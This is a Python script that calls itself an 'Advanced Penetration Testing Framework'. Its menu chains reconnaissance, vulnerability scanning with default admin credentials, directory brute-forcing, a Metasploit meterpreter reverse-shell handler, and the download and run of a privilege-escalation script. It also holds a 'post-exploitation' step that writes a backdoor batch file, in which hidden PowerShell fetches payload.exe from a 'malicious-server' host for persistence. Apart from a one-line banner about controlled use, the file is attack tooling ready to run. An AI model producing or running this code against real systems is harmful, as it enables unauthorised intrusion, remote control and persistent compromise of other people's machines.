import os
import subprocess
import requests
import time

# Color coding for terminal
RESET = "\033[0m"
GREEN = "\033[92m"
RED = "\033[91m"

def banner():
    print(f"{GREEN}Advanced Penetration Testing Framework{RESET}")
    print(f"{GREEN}Use this script ONLY in a controlled environment.{RESET}")

# 1. Target Information Gathering (Reconnaissance)
def reconnaissance(target):
    print(f"{GREEN}[+] Starting Reconnaissance for {target}...{RESET}")

    # Passive Reconnaissance
    print(f"{GREEN}[+] Running WHOIS lookup...{RESET}")
    try:
        whois_data = subprocess.getoutput(f"whois {target}")
        print(whois_data)
    except Exception as e:
        print(f"{RED}[-] WHOIS lookup failed: {e}{RESET}")

    # Active Reconnaissance
    print(f"{GREEN}[+] Scanning open ports with Nmap...{RESET}")
    try:
        nmap_data = subprocess.getoutput(f"nmap -Pn -sV {target}")
        print(nmap_data)
    except Exception as e:
        print(f"{RED}[-] Nmap scan failed: {e}{RESET}")

    print(f"{GREEN}[+] Gathering Shodan Data...{RESET}")
    # Replace with your Shodan API key
    shodan_api_key = "YOUR_API_KEY"
    url = f"https://api.shodan.io/shodan/host/{target}?key={shodan_api_key}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(response.json())
        else:
            print(f"{RED}[-] Shodan returned an error: {response.text}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error in Shodan lookup: {e}{RESET}")

# 2. Vulnerability Analysis
def vulnerability_analysis(target):
    print(f"{GREEN}[+] Running Vulnerability Scans on {target}...{RESET}")

    # OpenVAS or Nessus (Assume they are pre-installed)
    print(f"{GREEN}[+] Starting OpenVAS Scan...{RESET}")
    os.system(f"omp -u admin -w admin -h {target}")

    print(f"{GREEN}[+] Running Nikto for web vulnerability assessment...{RESET}")
    try:
        nikto_data = subprocess.getoutput(f"nikto -h {target}")
        print(nikto_data)
    except Exception as e:
        print(f"{RED}[-] Nikto scan failed: {e}{RESET}")

# 3. Directory Brute-forcing
def brute_force_directories(target, wordlist):
    print(f"{GREEN}[+] Starting Directory Brute-forcing for {target}...{RESET}")
    with open(wordlist, 'r') as file:
        for line in file:
            dir_to_test = line.strip()
            url = f"{target}/{dir_to_test}"

            try:
                response = requests.get(url)
                # If the response is not a 404, consider it a valid directory
                if response.status_code != 404:
                    print(f"{GREEN}[+] Found: {url} (Status Code: {response.status_code}){RESET}")
            except requests.RequestException as e:
                print(f"{RED}[-] Error accessing {url}: {e}{RESET}")

# 4. Exploitation
def exploitation(target, lhost, lport):
    print(f"{GREEN}[+] Exploiting Target {target}...{RESET}")

    # Example: Running Metasploit commands
    exploit_script = f"""
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST {lhost}
    set LPORT {lport}
    exploit
    """

    with open("exploit.rc", "w") as file:
        file.write(exploit_script)

    os.system("msfconsole -r exploit.rc")

# 5. Privilege Escalation
def privilege_escalation():
    print(f"{GREEN}[+] Running Privilege Escalation Scripts...{RESET}")

    print(f"{GREEN}[+] Running LinPEAS for Linux...{RESET}")
    os.system("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")
    os.system("chmod +x linpeas.sh && ./linpeas.sh")

    print(f"{GREEN}[+] Running Windows Exploit Suggester...{RESET}")
    os.system("windows-exploit-suggester.py --update")

# 6. Post-Exploitation
def post_exploitation():
    print(f"{GREEN}[+] Setting up persistence and collecting sensitive data...{RESET}")

    # Example: Creating a backdoor
    backdoor_script = """
    @echo off
    powershell -w hidden -NoP -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://malicious-server/payload.exe' -OutFile 'C:\\\\Windows\\\\Temp\\\\payload.exe'"
    """

    with open("backdoor.bat", "w") as file:
        file.write(backdoor_script)

    print(f"{GREEN}[+] Backdoor script created: backdoor.bat{RESET}")

# Ask the user whether they want to go back to the menu or exit
def ask_continue():
    while True:
        choice = input(f"{GREEN}[+] Do you want to go back to the main menu or exit? (m = menu, e = exit): {RESET}")
        if choice.lower() == 'm':
            main()
            break
        elif choice.lower() == 'e':
            print(f"{GREEN}[+] Exiting the script...{RESET}")
            exit()
        else:
            print(f"{RED}[-] Invalid option. Please choose again.{RESET}")

# Main Menu
def main():
    banner()

    print("1. Reconnaissance")
    print("2. Vulnerability Analysis")
    print("3. Directory Brute-forcing")
    print("4. Exploitation")
    print("5. Privilege Escalation")
    print("6. Post-Exploitation")
    choice = input("Select an option: ")

    target = input("Enter target (IP/Domain): ") if choice in ['1', '2', '3', '4'] else None
    lhost = input("Enter LHOST (Your IP): ") if choice == '4' else None
    lport = input("Enter LPORT (Listening Port): ") if choice == '4' else None
    wordlist = input(f"Enter path to wordlist: ") if choice == '3' else None

    if choice == '1':
        reconnaissance(target)
    elif choice == '2':
        vulnerability_analysis(target)
    elif choice == '3':
        brute_force_directories(target, wordlist)
    elif choice == '4':
        exploitation(target, lhost, lport)
    elif choice == '5':
        privilege_escalation()
    elif choice == '6':
        post_exploitation()
    else:
        print(f"{RED}Invalid choice!{RESET}")

    ask_continue()

if __name__ == "__main__":
    main()

